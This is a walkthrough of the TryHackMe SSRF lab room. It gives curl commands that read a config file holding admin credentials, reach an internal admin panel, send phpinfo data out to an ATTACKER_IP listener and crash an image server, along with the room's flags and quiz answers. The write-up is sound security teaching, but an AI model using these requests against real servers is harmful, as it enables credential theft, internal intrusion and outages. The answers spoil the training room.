---
title: "TryHackMe SSRF: forging requests from the server side"
date: 2026-10-19T07:05:00+05:30
lastmod: 2026-10-19T07:05:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-ssrf/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - SSRF
  - server-side request forgery
  - web application pentesting
  - advanced server-side attacks
  - OOB exfiltration
  - denial of service

draft: false
description: "TryHackMe SSRF walkthrough: local config theft via file_get_contents, internal admin pivot, blind OOB phpinfo exfiltration, and memory crash DoS."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|SSRF |![SSRF room icon](https://cdn-images.tryhackme.com/room-icons/2c96a7dbf8b1499dfbfc7d6518c1d49d.png)|

This medium-difficulty room in the Web Application Pentesting path walks through all four flavours of Server-Side Request Forgery against an HRMS application: basic local reads, basic internal pivots, blind out-of-band exfiltration, and denial of service through resource exhaustion. It sits in the Advanced Server-Side Attacks module alongside the [SSTI walkthrough](/post/thm-room-ssti/) and the [Injectics walkthrough](/post/thm-room-injectics/).

## Task 1: Introduction

A brief overview of SSRF and why it matters. No questions.

## Task 2: Anatomy of an SSRF Attack

Theory on how SSRF works: an attacker tricks the server into making requests on their behalf, reaching local files, internal services, or external endpoints the server trusts. The task covers the vulnerable pattern (unsanitised URL parameters passed to functions like `file_get_contents` or `curl`) and diagrams the request flow.

No questions.

## Task 3: Local server reads via file_get_contents

The HRMS application serves a profile page at `profile.php?url=localhost/getInfo.php`. The `url` parameter is passed directly to `file_get_contents` with no validation:

```php
$uri = rtrim($_GET['url'], "/");
$path = ROOTPATH . $file;
if (file_exists($path)) {
    echo htmlspecialchars(file_get_contents($path));
}
```

Requesting `/?url=localhost/config` returned the application's configuration file:

```php
$adminURL = "http://192.168.2.10/admin.php";
$username = "hrmsadmin";
$password = "hrmsadmin@[REDACTED]";
```

Logging in with those credentials produced the first flag.

### Answers

- **What is the username to access the admin panel?** **hrmsadmin**
- **What is the password?** **hrmsadmin@[REDACTED]**
- **What is the admin URL as per the configuration file?** **http://192.168.2.10/admin.php**
- **What is the flag value after logging in?** **THM_{1NiT_S$rF}**

## Task 4: Internal network pivot via dropdown manipulation

After authenticating, the dashboard at `/details.php` has a category dropdown whose options point to internal URLs:

```html
<select name="category" id="category">
  <option value="http://192.168.2.10/employee.php">Employee</option>
  <option value="http://192.168.2.10/salary.php">Salary</option>
</select>
```

The server fetches whichever URL the `category` POST parameter contains. Replacing the value with `http://192.168.2.10/admin.php` made the HRMS server request the admin panel on the internal network and return its content, including the flag.

```bash
curl -s -b cookies.txt -H 'Host: hrms.thm' \
  -d 'category=http://192.168.2.10/admin.php' \
  "http://TARGET/details.php"
  # Admin panel accessed. Flag: THM_{B@$ic_s$rF}
```

{{< ad >}}

### Answers

- **Is accessing non-routable addresses possible if a server is vulnerable to SSRF (yea/nay)?** **yea**
- **What is the flag value after accessing the admin panel?** **THM_{B@$ic_s$rF}**

## Task 5: Blind OOB phpinfo exfiltration

The profile page has a second SSRF vector. The source code of `profile.php` captures `phpinfo()` output in an output buffer, then POSTs the entire blob to whatever URL the `url` parameter specifies:

```php
$targetUrl = $_GET['url'];
ob_start();
phpinfo();
$phpInfoData = ob_get_clean();
$ch = curl_init($targetUrl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $phpInfoData);
$response = curl_exec($ch);
```

This is a blind SSRF: the page shows only "Sending Analytics Data..." regardless of what happens. The server's response never reaches the attacker's browser.

To capture the data, I ran a Python HTTP server on my VPN interface and pointed the SSRF at it:

```bash
python3 server.py &
curl -s -b cookies.txt -H 'Host: hrms.thm' \
  "http://TARGET/profile.php?url=http://ATTACKER_IP:8080"
```

The server POSTed 82 KB of phpinfo HTML to my listener. Grepping the captured data:

```
Virtual Directory Support: disabled
PHP Extension Build: API20190902,NTS
```

### Answers

- **Does Out-of-band SSRF always include a technique in which an attacker always receives direct responses from the server (yea/nay)?** **nay**
- **What is the value for Virtual Directory Support on the PHP server per the logged data?** **disabled**
- **What is the value of the PHP Extension Build on the server?** **API20190902,NTS**
- **Which type of SSRF doesn't give us a direct response or feedback?** **blind**

## Task 6: Memory crash denial of service

The training page at `/url.php?id=192.168.2.10/trainingbanner.jpg` fetches images from the internal network. The application checks image size and crashes if it exceeds 100 KB, simulating a memory outage:

```bash
curl -s -b cookies.txt -H 'Host: hrms.thm' \
  "http://TARGET/url.php?id=192.168.2.10/bigImage.jpg"
  # Image server crashed. Flag: THM_{$$rF_Cr@$h3D}
```

In a real scenario, forcing a server to repeatedly fetch oversized resources consumes memory and can take down the service entirely.

### Answers

- **What is the flag value after loading a big image exceeding 100KB?** **THM_{$$rF_Cr@$h3D}**

## Task 7: Remedial measures

The room outlines six defences: strict input validation, URL allowlisting over blocklisting, network segmentation, Content-Security-Policy headers, strong access controls on internal resources, and comprehensive request logging.

### Answers

- **Which of the following is the suggested approach while handling trusted URLs?** **b** (maintaining an allowlist of trusted URLs)
- **Since SSRF mainly exploits server-side requests, is it optional to sanitise the input URLs or parameters (yea/nay)?** **nay**

## Task 8: Conclusion

Room complete.

## Takeaways

**Every URL parameter the server fetches is an SSRF surface, and each fetch primitive enables a different class of attack.** `file_get_contents` with a `localhost` URL leaked config files. A form dropdown with internal IPs gave access to an admin panel the external network could not reach. A `curl` POST to an attacker-controlled URL exfiltrated phpinfo. An image loader with no size check crashed the server. One vulnerability class, four distinct impacts.

**Blind SSRF is not a lesser finding than basic SSRF.** The OOB variant extracted the same phpinfo data that a direct read would have shown, just through a different channel. The attacker never sees a response in the browser, but the server still makes the request and sends the data. If a server fetches a URL you control, the response channel is a detail, not a limitation.

Room solved 100%: 8 tasks, 13 answers.
